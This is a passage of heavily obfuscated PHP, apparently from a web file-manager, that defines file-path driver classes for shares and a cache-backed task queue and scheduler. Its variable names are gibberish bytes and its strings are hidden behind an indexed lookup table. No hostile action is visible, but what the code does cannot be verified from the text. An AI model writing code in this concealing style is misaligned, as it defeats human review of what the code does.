$•Û˜Äé[$_SERVER[§Êá¸İ][192]] : !1; } public function pathThis($›¤ş©¯ø) { $ŞŒ£¡§¹ = $this->infoSimple($›¤ş©¯ø); return $ŞŒ£¡§¹ ? $ŞŒ£¡§¹[$_SERVER[§Êá¸İ][32]] : !1; } public function getPathOuter($Æµï“İÒ) { if (!$Æµï“İÒ) { return $Æµï“İÒ; } $•†Áµö = $this->parse($Æµï“İÒ); return KodIO::make($•†Áµö[$_SERVER[§Êá¸İ][483]]); } public function copyFolderFromIO($±½¼ı„ş, $·å¬×ıŸ, $üúŞÖ¨, $ïšì÷“, $í“–Ì›×) { $¹İºªˆß = $this->model->copyFolderFromIO($±½¼ı„ş, $·å¬×ıŸ, $üúŞÖ¨, $ïšì÷“, $í“–Ì›×); return KodIO::make($¹İºªˆß); } public function isParentOf($–Ì±ÜÎÚ, $şöÎ±ºí) { return $this->model->isParentOf($–Ì±ÜÎÚ, $şöÎ±ºí); } public function mkfile($Æ“¨†¥Û, $‡˜¶‹©é = '', $ñÔİæŸ = REPEAT_RENAME) { $çäáÎ§’ =& $_SERVER[§Êá¸İ]; $‹Ò²¹—Ç = $this->parse($Æ“¨†¥Û); $Æ“¨†¥Û = $‹Ò²¹—Ç[$çäáÎ§’[483]]; for ($’ÆËóõ© = 0; $’ÆËóõ© < count($‹Ò²¹—Ç[$çäáÎ§’[1429]]); $’ÆËóõ©++) { $¦øùãÛ² = $‹Ò²¹—Ç[$çäáÎ§’[1429]][$’ÆËóõ©]; if ($’ÆËóõ© == count($‹Ò²¹—Ç[$çäáÎ§’[1429]]) - 1) { $Æ“¨†¥Û = $this->model->mkfile($Æ“¨†¥Û, $¦øùãÛ², $‡˜¶‹©é, $ñÔİæŸ); break; } $Æ“¨†¥Û = $this->model->mkdir($Æ“¨†¥Û, $¦øùãÛ², REPEAT_SKIP); } return $this->getPathOuter($Æ“¨†¥Û); } public function mkdir($š•®ÏÅü, $äƒÁ½‰ñ = REPEAT_SKIP) { $½ù™¾›‹ =& $_SERVER[§Êá¸İ]; $´£ÁŒ«• = $this->parse($š•®ÏÅü); $š•®ÏÅü = $´£ÁŒ«•[$½ù™¾›‹[483]]; for ($×ßá§ê– = 0; $×ßá§ê– < count($´£ÁŒ«•[$½ù™¾›‹[1429]]); $×ßá§ê–++) { $Î¡ÛòÇì = $´£ÁŒ«•[$½ù™¾›‹[1429]][$×ßá§ê–]; $š•®ÏÅü = $this->model->mkdir($š•®ÏÅü, $Î¡ÛòÇì, $äƒÁ½‰ñ); } return $this->getPathOuter($š•®ÏÅü); } public function copyFile($ø“¬˜å‹, $¹¼øî¿¯, $ÙÚÔè— = REPEAT_REPLACE) { $°áÂ¢äá =& $_SERVER[§Êá¸İ]; $ëÀßÕáş = $this->parse($¹¼øî¿¯); $ûÌ»¼Ó¥ = $this->model->copy($ø“¬˜å‹, $ëÀßÕáş[$°áÂ¢äá[483]], $ÙÚÔè—, $ëÀßÕáş[$°áÂ¢äá[87]]); return $ûÌ»¼Ó¥ ? $this->getPathOuter($ûÌ»¼Ó¥) : !1; } public function moveFile($È­°ÆçÕ, $ºšÖì¹ç, $ï—Ô®“Æ = REPEAT_REPLACE) { $ğÊÉ‘íÑ =& $_SERVER[§Êá¸İ]; $éµÏÑ…Ç = $this->parse($ºšÖì¹ç); $Ù¬¶Æûİ = $this->model->move($È­°ÆçÕ, $éµÏÑ…Ç[$ğÊÉ‘íÑ[483]], $ï—Ô®“Æ, $éµÏÑ…Ç[$ğÊÉ‘íÑ[87]]); return $Ù¬¶Æûİ ? $this->getPathOuter($Ù¬¶Æûİ) : !1; } public function copy($Î¹Ñª¶¡, $Íª—ñãÏ, $ˆ‘¥˜¾ = REPEAT_REPLACE, $ĞÃ¬Ì = false) { $¨š³¦øÆ = $this->parse($Íª—ñãÏ); $Š¿ë•âé = $this->model->copy($Î¹Ñª¶¡, $¨š³¦øÆ[$_SERVER[§Êá¸İ][483]], $ˆ‘¥˜¾, $ĞÃ¬Ì); return $Š¿ë•âé ? $this->getPathOuter($Š¿ë•âé) : !1; } public function moveSameAllow() { } public function move($³Œü»Ô, $ËÅ÷×†ó, $¹Ë˜¾ÖÚ = REPEAT_REPLACE, $£—ï”Íì = false) { $âÕâ¯ö = $this->parse($ËÅ÷×†ó); $ö¢®ôÉş = $this->model->move($³Œü»Ô, $âÕâ¯ö[$_SERVER[§Êá¸İ][483]], $¹Ë˜¾ÖÚ, $£—ï”Íì); return $ö¢®ôÉş ? $this->getPathOuter($ö¢®ôÉş) : !1; } public function remove($úÄõòëÄ, $×Íğ¥ÌÁ = true) { return $this->model->remove($úÄõòëÄ, $×Íğ¥ÌÁ); } public function rename($úôğ·Ùı, $ÈÏ¬ÌÑÊ) { $Ä»û¦ÅŒ = $this->model->rename($úôğ·Ùı, $ÈÏ¬ÌÑÊ); return $Ä»û¦ÅŒ ? $this->getPathOuter($úôğ·Ùı) : $Ä»û¦ÅŒ; } public function size($õÊ¦¨Ò») { $¹á“ÆÏ = $this->infoSimple($õÊ¦¨Ò»); return $¹á“ÆÏ ? $¹á“ÆÏ[$_SERVER[§Êá¸İ][79]] : 0; } public function infoSimple($®í±­¹) { return $this->model->sourceInfo($®í±­¹); } public function info($ÅîååüÅ) { return $this->infoParse($ÅîååüÅ); } public function infoAuth($€ÙåøÓö) { return $this->infoParse($€ÙåøÓö, !1, !0); } public function infoWithChildren($¥ÑŒ’šÆ) { return $this->infoParse($¥ÑŒ’šÆ, !0); } protected function infoParse($Üò“°Ë, $Éß¹‰¬ = false, $œùŸ¶Ôæ = false) { if (!$Éß¹‰¬) { return $this->model->pathInfo($Üò“°Ë, $œùŸ¶Ôæ); } return $this->model->pathInfoMore($Üò“°Ë); } public function infoFullSimple($ûĞö‹Ã) { $¯æ¿‡ãã =& $_SERVER[§Êá¸İ]; $‚ñ¦úÃß = explode($¯æ¿‡ãã[8], $ûĞö‹Ã); $ÒºõÜÊÇ = implode($¯æ¿‡ãã[8], array_splice($‚ñ¦úÃß, 1)); return $this->model->pathInfoByPath($‚ñ¦úÃß[0], $ÒºõÜÊÇ); } public function infoFull($»„ÏÙÂ) { $æ„ÃŒ†— = $this->infoFullSimple($»„ÏÙÂ); return is_array($æ„ÃŒ†—) ? $this->model->pathInfo($æ„ÃŒ†—[$_SERVER[§Êá¸İ][193]]) : !1; } public function hashSimple($”“øªºÕ) { $÷íş€š =& $_SERVER[§Êá¸İ]; $ÒİúËù­ = $this->infoWithChildren($”“øªºÕ); return $ÒİúËù­[$÷íş€š[170]][$÷íş€š[680]]; } public function hashMd5($ÅÉ¨³ƒË) { $´Ë÷ª¿å =& $_SERVER[§Êá¸İ]; $ÄÎÜíó´ = $this->infoWithChildren($ÅÉ¨³ƒË); return $ÄÎÜíó´[$´Ë÷ª¿å[170]][$´Ë÷ª¿å[555]]; } public function exist($—¦÷‚£Ü) { $˜½ÔÎäÍ =& $_SERVER[§Êá¸İ]; $ã·§¡ = $this->parse($—¦÷‚£Ü); if (!$ã·§¡[$˜½ÔÎäÍ[87]]) { return $this->isFile($—¦÷‚£Ü) || $this->isFolder($—¦÷‚£Ü); } $Û¶ÛêÕ£ = array($˜½ÔÎäÍ[485] => $ã·§¡[$˜½ÔÎäÍ[483]], $˜½ÔÎäÍ[32] => $ã·§¡[$˜½ÔÎäÍ[87]]); $ë°¯áŠ° = $this->model->where($Û¶ÛêÕ£)->find(); return $ë°¯áŠ° ? !0 : !1; } public function isFile($åš‚ñ‰Ó) { $É’³Š… =& $_SERVER[§Êá¸İ]; $Ù»µÈ×õ = $this->infoSimple($åš‚ñ‰Ó); return $Ù»µÈ×õ && $Ù»µÈ×õ[$É’³Š…[493]] == $É’³Š…[228] ? !0 : !1; } public function isFolder($›§•öÎò) { $âá÷£ôø =& $_SERVER[§Êá¸İ]; $ÑåØåğÃ = $this->infoSimple($›§•öÎò); return $ÑåØåğÃ && $ÑåØåğÃ[$âá÷£ôø[493]] == $âá÷£ôø[91] ? !0 : !1; } public function listPath($÷å°§Ş, $˜¤Æƒ¤Ë = false) { $ÊáÜ¸¿ =& $_SERVER[§Êá¸İ]; if ($÷å°§Ş == $ÊáÜ¸¿[12]) { return !1; } $°º€«´ = array($ÊáÜ¸¿[485] => $÷å°§Ş); if ($˜¤Æƒ¤Ë) { return $this->model->listSource($°º€«´, -1); } return $this->model->listSource($°º€«´); } public function has($ì†§ÛÂ, $¡ ùçé = false, $ÖãÊÀº× = null) { $ø˜ïû” =& $_SERVER[§Êá¸İ]; $‰ØÎ×¡× = $this->infoWithChildren($ì†§ÛÂ); if ($¡ ùçé) { return array($ø˜ïû”[240] => $‰ØÎ×¡×[$ø˜ïû”[240]], $ø˜ïû”[239] => $‰ØÎ×¡×[$ø˜ïû”[239]]); } return $ÖãÊÀº× ? $‰ØÎ×¡×[$ø˜ïû”[240]] : $‰ØÎ×¡×[$ø˜ïû”[239]]; } public function listAll($ËŞ­ãîÈ) { $‡Ù·³ = IO::info($this->pathParse[$_SERVER[§Êá¸İ][87]]); if (!$‡Ù·³) { return array(); } return $this->model->listAll($ËŞ­ãîÈ); } public function getContent($ôˆÜ»ÎÉ) { return $this->model->getContent($ôˆÜ»ÎÉ); } public function setContent($ÉÍÅ×÷, $‚è£†¯å = '') { return $this->model->setContent($ÉÍÅ×÷, $‚è£†¯å); } public function fileSubstr($ŒÈÑË¤³, $¸ö­À­», $ı‡ûĞ¡ˆ) { return $this->model->fileSubstr($ŒÈÑË¤³, $¸ö­À­», $ı‡ûĞ¡ˆ); } public function download($çÕÄÙãš, $’ñ™®‰ñ = '') { $ç¬ÄÈ· = get_path_father($’ñ™®‰ñ); $Çúü…Ñ¼ = get_path_this($’ñ™®‰ñ); $íÑÁÚİÇ = $this->model->fileInfoGet($çÕÄÙãš); $‰À–æéú = IO::copy($íÑÁÚİÇ[$_SERVER[§Êá¸İ][87]], $ç¬ÄÈ·, !1, $Çúü…Ñ¼); return $‰À–æéú; } public function setModifyTime($åŠÒóŞ°, $ à‚Ù® = '') { $İöÈÍŸ‹ =& $_SERVER[§Êá¸İ]; if (!$åŠÒóŞ°) { return; } $this->model->where(array($İöÈÍŸ‹[499] => $åŠÒóŞ°))->save(array($İöÈÍŸ‹[88] => $ à‚Ù®)); } public function upload($Å½é”ÙÙ, $ííö­ùö, $•İ•£áè = false, $ÜìÏª¸¥ = REPEAT_REPLACE) { $ ¿Òœ£È =& $_SERVER[§Êá¸İ]; $Êöã²ß¨ = $this->parse($Å½é”ÙÙ); $ª¦±û¾¼ = $this->model->addFile($Êöã²ß¨[$ ¿Òœ£È[483]], $ííö­ùö, $Êöã²ß¨[$ ¿Òœ£È[87]], $•İ•£áè, $ÜìÏª¸¥); return $this->getPathOuter($ª¦±û¾¼); } public function uploadFileByID($’°“ı Œ, $®²äú´‚, $‡Ø®£Ğ›) { $Úíè´Ï­ =& $_SERVER[§Êá¸İ]; $™§ïç±§ = $this->parse($’°“ı Œ); $ğêá½ = $this->model->addFileByFileID($™§ïç±§[$Úíè´Ï­[483]], $®²äú´‚, $™§ïç±§[$Úíè´Ï­[87]], $‡Ø®£Ğ›); return $this->getPathOuter($ğêá½); } public function addFileByRemote($Á€óÛ¾Ã, $ß‰§¶ŒÂ, $Òç´ÌÑà = array(), $ı¤ÖƒØ = '', $ŒÍÅ¯Ü) { $¬¾Ñş =& $_SERVER[§Êá¸İ]; $ûÇ®â¡ç = $this->parse($Á€óÛ¾Ã); $ı¤ÖƒØ = empty($ı¤ÖƒØ) ? $ûÇ®â¡ç[$¬¾Ñş[87]] : $ı¤ÖƒØ; $ê†Š·—– = $this->model->addFileByRemote($ûÇ®â¡ç[$¬¾Ñş[483]], $ß‰§¶ŒÂ, $ı¤ÖƒØ, $Òç´ÌÑà, $ŒÍÅ¯Ü); return $this->getPathOuter($ê†Š·—–); } public function uploadLink($Àà˜Â„Â, $ğÌİ÷œ = 0) { $ƒô…ÍÄè =& $_SERVER[§Êá¸İ]; $íï¼¡ÛÚ = $this->parse($Àà˜Â„Â); $÷ÔÏ‹Ö = _get($GLOBALS[$ƒô…ÍÄè[7]], $ƒô…ÍÄè[1430]); $«æÓõÇ = _get($GLOBALS[$ƒô…ÍÄè[7]], $ƒô…ÍÄè[1431]); $Àà˜Â„Â = Model($ƒô…ÍÄè[682])->createFileName($íï¼¡ÛÚ[$ƒô…ÍÄè[87]], $÷ÔÏ‹Ö, $«æÓõÇ); return IO::uploadLink($Àà˜Â„Â, $ğÌİ÷œ); } public function fileNameAuto($Òò„«É, $¸ó¬³ğ, $¶®£‹Ã = REPEAT_REPLACE, $¿±Ì­Ú´ = false) { return $this->model->fileNameAuto($Òò„«É, $¸ó¬³ğ, $¶®£‹Ã, $¿±Ì­Ú´); } public function fileNameExist($ËèÕ©¡, $¶œ«¤Â¤) { return $this->model->fileNameExist($ËèÕ©¡, $¶œ«¤Â¤); } protected function _fileOut($ıë‹å¦‚, $”ı™ã°İ = false, $ŞÑ ÄõŒ = false, $âƒÎ™´ = '', $ğÊ××”‘ = false) { $ğâÌ§™³ =& $_SERVER[§Êá¸İ]; $­ëıÏïÍ = $this->model->sourceInfo($ıë‹å¦‚); if ($­ëıÏïÍ[$ğâÌ§™³[493]] == $ğâÌ§™³[91]) { header($ğâÌ§™³[1432]); die; } $áë´¦¬å = $this->model->fileInfoGet($ıë‹å¦‚); $âƒÎ™´ = $áë´¦¬å[$ğâÌ§™³[555]] ? $áë´¦¬å[$ğâÌ§™³[555]] : $âƒÎ™´; $¼ãÎóô¨ = isset($GLOBALS[$ğâÌ§™³[182]]) && is_array($GLOBALS[$ğâÌ§™³[182]]) ? $GLOBALS[$ğâÌ§™³[182]][$ğâÌ§™³[32]] : $­ëıÏïÍ[$ğâÌ§™³[32]]; if ($ğÊ××”‘) { return IO::fileOutServer($áë´¦¬å[$ğâÌ§™³[87]], $”ı™ã°İ, $¼ãÎóô¨, $âƒÎ™´); } IO::fileOut($áë´¦¬å[$ğâÌ§™³[87]], $”ı™ã°İ, $¼ãÎóô¨, $âƒÎ™´); } public function fileOut($½ÎÂù„á, $£±†Ä’™ = false, $¤ù¹“½Ë = false, $¸äı·÷Ø = '') { $this->_fileOut($½ÎÂù„á, $£±†Ä’™, $¤ù¹“½Ë, $¸äı·÷Ø); } public function fileOutServer($Ûæ´®ò, $¥¿óëãÇ = false, $éÜ²˜—ú = false, $­õüÒäÊ = '') { $this->_fileOut($Ûæ´®ò, $¥¿óëãÇ, $éÜ²˜—ú, $­õüÒäÊ, !0); } protected function _fileOutImage($İ¸•Áåş, $Îó¡Ÿ·Û = 250) { $æŞ„å‚ß =& $_SERVER[§Êá¸İ]; $ä–È’ = $this->model->pathInfo($İ¸•Áåş); if ($ä–È’[$æŞ„å‚ß[493]] == $æŞ„å‚ß[91]) { show_json($æŞ„å‚ß[1433] . $İ¸•Áåş, !1); } $æ˜ò’ØŸ = $this->model->fileInfoGet($İ¸•Áåş); $ä–È’[$æŞ„å‚ß[183]] = $æ˜ò’ØŸ[$æŞ„å‚ß[87]]; $GLOBALS[$æŞ„å‚ß[182]] = $ä–È’; IO::fileOutImage($æ˜ò’ØŸ[$æŞ„å‚ß[87]], $Îó¡Ÿ·Û); } public function fileOutImage($û»é«À, $¹òâá¥» = 250) { $this->_fileOutImage($û»é«À, $¹òâá¥»); } public function fileOutImageServer($®‰ì±­Ñ, $ã’âÍ† = 250) { $this->_fileOutImage($®‰ì±­Ñ, $ã’âÍ†); } public function link($óäÂ¦ì, $ ç†Šã = '') { $¢¾¿ƒôË = $this->model->fileInfoGet($óäÂ¦ì); return IO::link($¢¾¿ƒôË[$_SERVER[§Êá¸İ][87]], $ ç†Šã); } protected function parse($¡ÍÈ) { $ÆŸÔíàš =& $_SERVER[§Êá¸İ]; if (strstr($¡ÍÈ, $ÆŸÔíàš[8]) === !1) { return array($ÆŸÔíàš[501] => intval($¡ÍÈ), $ÆŸÔíàš[87] => $ÆŸÔíàš[12], $ÆŸÔíàš[1429] => array()); } $ôó­¾‘“ = explode($ÆŸÔíàš[8], trim($¡ÍÈ, $ÆŸÔíàš[8])); if (count($ôó­¾‘“) < 2) { show_tips(clear_html($¡ÍÈ) . $ÆŸÔíàš[1434]); } return array($ÆŸÔíàš[501] => intval($ôó­¾‘“[0]), $ÆŸÔíàš[87] => $ôó­¾‘“[1], $ÆŸÔíàš[1429] => array_slice($ôó­¾‘“, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($¸¬øçÖ“) { $this->pathParse = $¸¬øçÖ“; $this->model = Model($_SERVER[§Êá¸İ][1428]); } public function getPathOuter($İŠœ ¡Æ) { $Ì˜óÕóã =& $_SERVER[§Êá¸İ]; if (!$İŠœ ¡Æ) { return $İŠœ ¡Æ; } $µµ öÇÎ = $this->parse($İŠœ ¡Æ); return trim(KodIO::makeShare($this->pathParse[$Ì˜óÕóã[483]], $µµ öÇÎ[$Ì˜óÕóã[483]]), $Ì˜óÕóã[8]); } protected function infoParse($›”Â¾«¹, $ä¡Œ²§É = false, $›Ëí´Ê = false) { $ÌÍÆÙö =& $_SERVER[§Êá¸İ]; $œïãÔ»× = $this->pathParse[$ÌÍÆÙö[483]]; $–Ú¨”öÇ = trim($this->pathParse[$ÌÍÆÙö[1260]], $ÌÍÆÙö[8]); return Action($ÌÍÆÙö[1435])->sharePathInfo($œïãÔ»×, $–Ú¨”öÇ, $ä¡Œ²§É); } public function infoFull($ò¾Áúî¤) { $ÇÊ¦ˆ† =& $_SERVER[§Êá¸İ]; $õ¼£Ë‚… = explode($ÇÊ¦ˆ†[8], trim($ò¾Áúî¤, $ÇÊ¦ˆ†[8])); if (count($õ¼£Ë‚…) > 1) { $€†” ‹ = implode($ÇÊ¦ˆ†[8], array_splice($õ¼£Ë‚…, 1)); $ıÅğ÷ùŞ = $this->model->pathInfoByPath($õ¼£Ë‚…[0], $€†” ‹); if (!$ıÅğ÷ùŞ) { return !1; } $this->pathParse[$ÇÊ¦ˆ†[1260]] = $ıÅğ÷ùŞ[$ÇÊ¦ˆ†[193]]; } return $this->infoParse($ò¾Áúî¤); } public function listAll($üáí¨‰·) { $¸Ù¡¸ª± =& $_SERVER[§Êá¸İ]; $·„Ûğ¯ = IO::info($this->pathParse[$¸Ù¡¸ª±[87]]); if (!$·„Ûğ¯) { return array(); } $†ğĞ°¡â = $this->model->listAll($üáí¨‰·); $ÉŒî€œ¼ = Model($¸Ù¡¸ª±[672])->getInfo($·„Ûğ¯[$¸Ù¡¸ª±[673]]); foreach ($†ğĞ°¡â as &$¥øÍ“Òß) { check_abort(); $¥øÍ“Òß[$¸Ù¡¸ª±[90]] = Action($¸Ù¡¸ª±[1435])->_shareItemeParse($¥øÍ“Òß[$¸Ù¡¸ª±[90]], $ÉŒî€œ¼); } unset($¥øÍ“Òß); return $†ğĞ°¡â; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ü”­Ê€ö) { $this->pathParse = $ü”­Ê€ö; $this->model = Model($_SERVER[§Êá¸İ][1428]); } protected function infoParse($©‘±Šüà, $Ì±Ñëî“ = false, $’§•Ğ€¬ = false) { $çäÌÇ¢ß =& $_SERVER[§Êá¸İ]; return Action($çäÌÇ¢ß[1266])->sharePathInfo($this->pathParse[$çäÌÇ¢ß[87]], !0, $Ì±Ñëî“); } public function listPath($¢Àª¼, $ıÆˆÄ†¾ = false) { $ËÛ¨¤¨© =& $_SERVER[§Êá¸İ]; $µ—ƒØ‰¶ = parent::listPath($¢Àª¼, $ıÆˆÄ†¾); if (!$µ—ƒØ‰¶) { return $µ—ƒØ‰¶; } if (is_array($µ—ƒØ‰¶[$ËÛ¨¤¨©[1436]])) { $µ—ƒØ‰¶[$ËÛ¨¤¨©[1436]] = Action($ËÛ¨¤¨©[1266])->shareItemInfo($µ—ƒØ‰¶[$ËÛ¨¤¨©[1436]]); } foreach ($µ—ƒØ‰¶ as $£±…œÖó => $İøÁÍ¶æ) { if (!in_array($£±…œÖó, array($ËÛ¨¤¨©[86], $ËÛ¨¤¨©[85]))) { continue; } foreach ($İøÁÍ¶æ as $ïÜğÌÒÛ => $º°ãâç) { $µ—ƒØ‰¶[$£±…œÖó][$ïÜğÌÒÛ] = Action($ËÛ¨¤¨©[1266])->shareItemInfo($º°ãâç); } } return $µ—ƒØ‰¶; } public function listAll($âÒ¢şâ) { $Å–âÄÌÌ =& $_SERVER[§Êá¸İ]; $ÃÇÂ§« = IO::info($this->pathParse[$Å–âÄÌÌ[87]]); if (!$ÃÇÂ§«) { return array(); } $Âåƒö’ = $this->model->listAll($âÒ¢şâ); foreach ($Âåƒö’ as &$¼ØÔ’•÷) { $¼ØÔ’•÷[$Å–âÄÌÌ[90]] = Action($Å–âÄÌÌ[1266])->shareItemInfo($¼ØÔ’•÷[$Å–âÄÌÌ[90]]); } unset($¼ØÔ’•÷); return $Âåƒö’; } } goto EÀ¨¶Ë¨êç; E¼ùê³•Üá: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\x73\153\121\x75\145\x75\x65\114\145\x6e\147\164\x68"; const QUEUE_DATA = "\x74\x61\163\x6b\x51\165\145\165\x65\104\141\x74\141"; const QUEUE_TIME = "\164\141\163\153\121\165\145\165\x65\114\141\x73\164\122\165\x6e"; const QUEUE_THREAD = "\x74\141\163\x6b\x51\x75\x65\165\145\124\150\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($™«»²Î®, $Š úÅ‡ğ = array(), $ÎãÓ‡Ä = '', $ˆ™ı¹× = '') { $îÔÑ×®£ =& $_SERVER[§Êá¸İ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ˆ™ı¹× && array_find_by_field(self::$listData, $îÔÑ×®£[97], $ˆ™ı¹×)) { return !0; } if ($ˆ™ı¹× && array_find_by_field(self::$listDataAdd, $îÔÑ×®£[97], $ˆ™ı¹×)) { return !0; } self::$listDataAdd[] = array($îÔÑ×®£[341] => $™«»²Î®, $îÔÑ×®£[1877] => $Š úÅ‡ğ, $îÔÑ×®£[534] => $ÎãÓ‡Ä, $îÔÑ×®£[97] => $ˆ™ı¹×); return !0; } public static function addSubmit() { $âŒ„™¨Š =& $_SERVER[§Êá¸İ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($âŒ„™¨Š[1878] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $âŒ„™¨Š[12], $âŒ„™¨Š[534])), $âŒ„™¨Š[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ß‰Ñ¦Ê, $û€à«¹ı = array(), $­ïöˆÇ = '', $ÍÕŞÎñÕ = '') { $ƒ—Ïµœ† =& $_SERVER[§Êá¸İ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¯ÛÖÊ…” = self::getAll(); if ($ÍÕŞÎñÕ && array_find_by_field($¯ÛÖÊ…”, $ƒ—Ïµœ†[97], $ÍÕŞÎñÕ)) { return !0; } $¯ÛÖÊ…”[] = array($ƒ—Ïµœ†[341] => $ß‰Ñ¦Ê, $ƒ—Ïµœ†[1877] => $û€à«¹ı, $ƒ—Ïµœ†[534] => $­ïöˆÇ, $ƒ—Ïµœ†[97] => $ÍÕŞÎñÕ); self::setAll($¯ÛÖÊ…”); write_log($ƒ—Ïµœ†[1878] . $­ïöˆÇ, $ƒ—Ïµœ†[197]); return !0; } public static function run() { $Ú¯ŠàĞÍ =& $_SERVER[§Êá¸İ]; $é™Ø´Ö´ = self::getAll(); $âÑæéš = array_shift($é™Ø´Ö´); if (!$âÑæéš) { return !1; } self::setAll($é™Ø´Ö´); $•¼ŒƒËÈ = timeFloat(); $äÒ´šóÉ = $Ú¯ŠàĞÍ[12]; try { $äÒ´šóÉ = Hook::apply($âÑæéš[$Ú¯ŠàĞÍ[341]], $âÑæéš[$Ú¯ŠàĞÍ[1877]]); } catch (Exception $øİŸôàŞ) { write_log($øİŸôàŞ, $Ú¯ŠàĞÍ[1274]); } $ÜÈ´èÜ = number_format(timeFloat() - $•¼ŒƒËÈ, 3) . $Ú¯ŠàĞÍ[1795]; if ($äÒ´šóÉ && is_string($äÒ´šóÉ)) { $ÜÈ´èÜ = $ÜÈ´èÜ . $Ú¯ŠàĞÍ[1879] . $äÒ´šóÉ; } write_log($Ú¯ŠàĞÍ[1880] . $âÑæéš[$Ú¯ŠàĞÍ[534]] . $Ú¯ŠàĞÍ[1881] . $ÜÈ´èÜ, $Ú¯ŠàĞÍ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $½Á¸ıú› =& $_SERVER[§Êá¸İ]; $„·™£± = self::threadCount() + 1; if ($„·™£± > 3 || !self::count()) { return; } write_log($½Á¸ıú›[1882] . $„·™£±, $½Á¸ıú›[197]); Cache::set(self::QUEUE_THREAD, $„·™£±, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($½Á¸ıú›[1883], $½Á¸ıú›[197]); } public static function getKey($²Ú‹‡Èì, $‹£Ç×œª = "\x69\156\x74") { $‡ÊàùÑ =& $_SERVER[§Êá¸İ]; Cache::removeMemory($²Ú‹‡Èì); $Ó†¼É‰Š = Cache::get($²Ú‹‡Èì); if ($‹£Ç×œª == $‡ÊàùÑ[364]) { return $Ó†¼É‰Š ? intval($Ó†¼É‰Š) : 0; } if ($‹£Ç×œª == $‡ÊàùÑ[1884]) { return is_array($Ó†¼É‰Š) ? $Ó†¼É‰Š : array(); } return $Ó†¼É‰Š; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[§Êá¸İ][1884]); } public static function setAll($˜¬Èì–) { $¬•úò£Ş = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($˜¬Èì–), $¬•úò£Ş); Cache::set(self::QUEUE_DATA, $˜¬Èì–, $¬•úò£Ş); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($šú‘¼Ëï, $·Òƒ‚Úâ = 5.0) { if (!$šú‘¼Ëï) { return; } $š®—ğ¡¥ = Cache::get($šú‘¼Ëï); if (!$š®—ğ¡¥ || timeFloat() - floatVal($š®—ğ¡¥) >= $·Òƒ‚Úâ) { Cache::set($šú‘¼Ëï, timeFloat(), $·Òƒ‚Úâ * 10); return !0; } return !1; } public static function timeLimitCall($ ¢Óõ”, $‚äÎ§íÚ, $¹¥‚”», $Í¡›ª¬ = 5.0) { $É¤Ñ¾ñ™ =& $_SERVER[§Êá¸İ]; if (!$ ¢Óõ” || !$‚äÎ§íÚ) { return; } self::$asyncAdd = !0; $ÃıÕÊƒ = $É¤Ñ¾ñ™[1885]; $¸ªôÚ¯— = Cache::get($ÃıÕÊƒ, !0); $ÛŠŞÕÍñ = array($É¤Ñ¾ñ™[1886] => timeFloat(), $É¤Ñ¾ñ™[1887] => timeFloat(), $É¤Ñ¾ñ™[341] => $‚äÎ§íÚ, $É¤Ñ¾ñ™[1877] => $¹¥‚”», $É¤Ñ¾ñ™[206] => $Í¡›ª¬); if (is_array($¸ªôÚ¯—[$ ¢Óõ”])) { $ÛŠŞÕÍñ[$É¤Ñ¾ñ™[1887]] = $¸ªôÚ¯—[$ ¢Óõ”][$É¤Ñ¾ñ™[1887]]; } if (is_array($¸ªôÚ¯—[$ ¢Óõ”])) { if (timeFloat() - $¸ªôÚ¯—[$ ¢Óõ”][$É¤Ñ¾ñ™[1886]] < $ÛŠŞÕÍñ[$É¤Ñ¾ñ™[206]] * 0.3) { return; } $ÛŠŞÕÍñ[$É¤Ñ¾ñ™[1887]] = $¸ªôÚ¯—[$ ¢Óõ”][$É¤Ñ¾ñ™[1887]]; } $¸ªôÚ¯—[$ ¢Óõ”] = $ÛŠŞÕÍñ; Cache::set($ÃıÕÊƒ, $¸ªôÚ¯—, 60); Cache::removeMemory($ÃıÕÊƒ); write_log($É¤Ñ¾ñ™[1888] . $ ¢Óõ” . $É¤Ñ¾ñ™[74] . $‚äÎ§íÚ, $É¤Ñ¾ñ™[197]); } public static function timeLimitCallLoop() { $ŠªÅò¶· =& $_SERVER[§Êá¸İ]; $©ó»á„ = array($ŠªÅò¶·[1889]); $ƒÄíŒ’ = in_array(strtolower(ACTION), $©ó»á„); if (!$ƒÄíŒ’ && !self::$asyncAdd) { return; } $§Ø§º¬Ã = $ŠªÅò¶·[1885]; $â™êí»² = Cache::get($§Ø§º¬Ã, !0); if (!$â™êí»² || count($â™êí»²) <= 0) { return; } $¦«ªÊâ„ = !1; $æ‘Ñ²÷³ = timeFloat(); $¢õÄé‘ = array(); foreach ($â™êí»² as $êØ€ƒ => $ÇÜ³´) { if ($æ‘Ñ²÷³ - $ÇÜ³´[$ŠªÅò¶·[1887]] > $ÇÜ³´[$ŠªÅò¶·[206]]) { $¦«ªÊâ„ = !0; try { Hook::apply($ÇÜ³´[$ŠªÅò¶·[341]], $ÇÜ³´[$ŠªÅò¶·[1877]]); write_log($ŠªÅò¶·[1890] . $êØ€ƒ . $ŠªÅò¶·[74] . $ÇÜ³´[$ŠªÅò¶·[341]] . $ŠªÅò¶·[1891] . ACTION, $ŠªÅò¶·[197]); } catch (Exception $Óà§…¿¡) { } continue; } 